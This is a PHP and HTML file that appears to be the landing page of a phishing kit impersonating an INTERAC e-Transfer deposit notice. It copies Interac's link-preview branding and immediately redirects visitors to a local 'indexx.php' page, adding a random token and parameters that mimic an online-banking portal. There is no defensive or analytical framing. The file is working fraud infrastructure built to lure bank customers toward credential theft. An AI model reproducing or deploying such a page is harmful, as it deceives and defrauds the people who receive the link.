<?php
$md5 = md5(uniqid(time()));
$loc="indexx.php?0hrcode-myonportal=6&cmdONLINE=transfer-code".$md5;
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta property="og:title" content="Deposit your INTERAC e-Transfer">
<meta property="og:description" content="Receiving an INTERAC e-Transfer is fast and free using your mobile or online banking.">
<meta property="og:image" content="https://s3.amazonaws.com/etransfer-notification.interac.ca/images/etransfer_thumbnail_en.png">
<meta property="og:url" content="https://etransfer.interac.ca/?lang=en">
<meta property="og:site_name" content="INTERAC e-Transfer">
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $loc; ?>">

<script type="text/javascript">
loc = "<?php echo $loc; ?>"
self.location.replace(loc);
window.location = loc;
</script>
</head>